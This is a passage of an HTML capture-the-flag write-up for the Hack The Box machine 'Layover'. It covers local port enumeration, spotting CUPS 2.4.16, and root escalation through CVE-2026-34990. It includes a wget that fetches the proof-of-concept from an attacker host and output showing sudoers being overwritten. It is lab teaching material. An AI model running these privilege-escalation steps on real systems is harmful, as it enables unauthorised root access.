+aporter@portal:/var/www/portal$ cat ~/user.txt
+fdc4f4df6f3e82dbf00d38c10bba823c</code></pre>
+
+        <h2 id="root">Shell as root</h2>
+
+        <h3>Local Port Enumeration</h3>
+        <p>
+          Checked listening ports on the box itself, because nmap through chisel never showed this
+          one — it's bound to localhost only. lol.
+        </p>
+        <pre><code>aporter@portal:~$ ss -tlnp
+State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
+LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*
+LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*
+LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*
+LISTEN 0      511          0.0.0.0:80        0.0.0.0:*
+LISTEN 0      4096       127.0.0.1:631       0.0.0.0:*
+LISTEN 0      4096      127.0.0.54:53        0.0.0.0:*
+LISTEN 0      4096           [::1]:631          [::]:*
+LISTEN 0      4096            [::]:22            [::]:*
+LISTEN 0      511             [::]:80            [::]:*</code></pre>
+
+        <h3>CUPS 2.4.16</h3>
+        <p>
+          Port <code>631</code> is IPP, which means CUPS. Checked the usual paths and found exactly
+          what the docs say should be there (<a
+            href="https://www.cups.org/doc/man-cups-files.conf.html"
+            target="_blank"
+            rel="noopener noreferrer"
+            >cups-files.conf</a
+          >):
+        </p>
+        <pre><code>aporter@portal:~$ ls /var/log/ | grep cup
+cups
+aporter@portal:~$ ls /var/log/cups
+access_log  error_log  page_log</code></pre>
+        <p>The help page also gives the version away for free:</p>
+        <pre><code>aporter@portal:~$ curl http://localhost:631/help
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    ...
+    &lt;title&gt;Online Help - CUPS 2.4.16&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body onload="check_cookies();"&gt;
+    ...
+    &lt;li&gt;&lt;a href="/admin"&gt;Administration&lt;/a&gt;&lt;/li&gt;
+    &lt;li&gt;&lt;a href="/printers/"&gt;Printers&lt;/a&gt;&lt;/li&gt;
+    ...
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+        <p>
+          CUPS 2.4.16 — vulnerable to a local privesc:
+          <a
+            href="https://github.com/predyy/CVE-2026-34990"
+            target="_blank"
+            rel="noopener noreferrer"
+            >CVE-2026-34990</a
+          >. Grabbed the PoC on my attacker box and passed it down the chain: attacker → contractor
+          → aporter.
+        </p>
+        <pre><code>aporter@portal:~$ wget http://10.13.37.182:8000/poc.py
+--2026-10-23 06:34:28--  http://10.13.37.182:8000/poc.py
+Connecting to 10.13.37.182:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6621 (6.5K) [text/x-python]
+Saving to: 'poc.py'
+
+poc.py              100%[===================&gt;]   6.47K  --.-KB/s    in 0s
+
+2026-10-23 06:34:28 (431 MB/s) - 'poc.py' saved [6621/6621]
+
+aporter@portal:~$ python3 poc.py
+[*] CVE-2026-34990 | user=aporter | cupsd=127.0.0.1:631
+[*] coercing cupsd -&gt; rogue server ...
+[+] captured token: 0B90769A16E5014306E34C85EC63FEF5
+[*] writing sudoers ...
+[+] wrote /etc/sudoers.d/aporter-pwn
+[+] ROOT: uid=0(root) gid=0(root) groups=0(root)
+[*] run: sudo -i
+aporter@portal:~$ sudo -i
+root@portal:~# cat /root.txt
+cat: /root.txt: No such file or directory
+root@portal:~# cat /root/root.txt
+58b220f015e4f6aa12aad69ce6440333</code></pre>
+        <blockquote>
+          🔴 And there it is: <code>58b220f015e4f6aa12aad69ce6440333</code>. Yes, it lives in
+          <code>/root/root.txt</code>, not <code>/root.txt</code> — I absolutely
+          <code>cat</code> the wrong path first, as you can see. Every box needs at least one dumb
+          moment.
+        </blockquote>
+        <figure class="shot">
+          <img
+            src="../assets/writeups/layover/root-txt.png"
+            alt="Reading root.txt as root"
+            width="902"
+            height="578"
+            loading="lazy"
+            decoding="async"
+          />
+        </figure>
+
+        <h2 id="takeaways">Takeaways</h2>
+        <p>
+          GG, Layover. Cloning <code>wlan2</code> into <code>mon2</code> is still my favorite part of
+          this one — instead of using the empty <code>wlan3</code> that was just sitting there, we
+          built our own monitor interface from scratch.
+        </p>
+        <p>
+          The chain itself is a good reminder that "internal" is not the same as "trusted": a
+          workstation password reused for <code>sudo</code>, cleartext WiFi traffic, secrets living
+          in <code>.env</code>, and a localhost-only printing service were enough to go from a
+          contractor login to root.
+        </p>
+      </article>
+
+      <footer class="article__foot">
+        <a class="btn btn--ghost" href="../index.html#writeups">
+          <svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+            <path
+              d="M10.7 5.3a1 1 0 0 1 0 1.4L6.42 11H20a1 1 0 0 1 0 2H6.42l4.3 4.3a1 1 0 0 1-1.42 1.4l-6-6a1 1 0 0 1 0-1.4l6-6a1 1 0 0 1 1.4 0Z"
+            />
+          </svg>
+          All writeups
+        </a>
+        <a
+          class="btn btn--primary"
+          href="https://app.hackthebox.com/machines/Layover"
+          target="_blank"
+          rel="noreferrer noopener"
+        >
+          Machine on HTB
+          <svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+            <path
+              d="M14 3h6a1 1 0 0 1 1 1v6a1 1 0 0 1-2 0V5.41l-8.29 8.3a1 1 0 0 1-1.42-1.42L17.59 4H14a1 1 0 0 1 0-2ZM5 5h4a1 1 0 0 1 0 2H5v12h12v-4a1 1 0 0 1 2 0v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2Z"
+            />
+          </svg>
+        </a>
+      </footer>
+    </main>
+
+    <footer class="footer">
+      <div class="footer__inner">
+        <p class="footer__name">Bintang Fajar Putera Faza</p>
+        <p class="footer__meta">
+          <span>Lamongan · Indonesia</span>
+          <span aria-hidden="true">·</span>
+          <span>© <span id="year">2026</span></span>
+        </p>
+      </div>
+    </footer>
+
+    <script src="../site.js" defer></script>
+  </body>
+</html>
